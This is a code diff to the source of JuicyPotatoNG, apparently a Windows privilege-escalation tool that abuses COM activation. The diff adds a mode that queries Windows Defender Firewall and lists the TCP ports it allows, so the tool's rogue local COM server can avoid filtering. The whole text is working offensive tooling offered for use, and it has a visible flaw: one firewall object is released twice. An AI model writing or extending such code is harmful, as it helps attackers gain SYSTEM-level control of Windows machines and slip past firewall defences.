@@ -1,6 +1,7 @@
 #include "Windows.h"
 #include "stdio.h"
 #include "strsafe.h"
+#include "netfw.h"
 #include "PotatoTrigger.h"
 #include "SSPIHooks.h"
 #include "BruteforceCLSIDs.h"
@@ -15,10 +16,10 @@ void usage();
 void ImpersonateInteractiveSid();
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
 int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode);
+void SeekNonFilteredPorts();
 
 int wmain(int argc, wchar_t** argv)
 {
-
 	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
 	WCHAR defaultComPort[] = L"10247";
 	PWCHAR clsidStr = defaultClsidStr;
@@ -104,6 +105,11 @@ int wmain(int argc, wchar_t** argv)
 
 	if (bruteforceClsids) {
 		BruteforceAllClisds();
+		return 0;
+	}
+
+	if (seekComPort) {
+		SeekNonFilteredPorts();
 		return 0;
 	}
 
@@ -282,6 +288,37 @@ cleanup:
 	return ret;
 }
 
+void SeekNonFilteredPorts() {
+	INetFwMgr* pNetFwMgr;
+	INetFwPolicy* pNetFwPolicy;
+	INetFwProfile* pNetFwProfile;
+	VARIANT allowed, restricted;
+	VARIANT_BOOL firewallEnabled;
+	printf("[*] Finding suitable port not filtered by Windows Defender Firewall to be used in our local COM Server port.\n");
+	CoInitialize(NULL);
+	CoCreateInstance(CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, IID_INetFwMgr, (LPVOID*)&pNetFwMgr);
+	pNetFwMgr->get_LocalPolicy(&pNetFwPolicy);
+	pNetFwPolicy->get_CurrentProfile(&pNetFwProfile);
+	pNetFwProfile->get_FirewallEnabled(&firewallEnabled);
+	if (!firewallEnabled) {
+		printf("[*] Windows Defender Firewall not enabled. Every COM port will work.\n");
+	}
+	else {
+		for (LONG portNumber = 20; portNumber < 65535; portNumber++) {
+			pNetFwMgr->IsPortAllowed((BSTR)L"System", NET_FW_IP_VERSION_ANY, portNumber, (BSTR)L"", NET_FW_IP_PROTOCOL_TCP, &allowed, &restricted);
+			if (allowed.boolVal) {
+				printf("[+] Found non filtered port: %d \n", portNumber);
+			}
+		}
+	}
+	pNetFwProfile->Release();
+	pNetFwPolicy->Release();
+	pNetFwMgr->Release();
+	pNetFwMgr->Release();
+	CoUninitialize();
+}
+
+
 void usage()
 {
 	printf("\n\n\t JuicyPotatoNG\n");
@@ -304,7 +341,7 @@ void usage()
 	printf("\n\n");
 	printf("Additional modes: \n"
 		"-b : Bruteforce all CLSIDs. !ALERT: USE ONLY FOR TESTING. About 1000 processes will be spawned!\n"
-		"-s : Seek for a suitable COM port not filtered by the Windows firewall\n"
+		"-s : Seek for a suitable COM port not filtered by Windows Defender Firewall\n"
 	);
 
 }
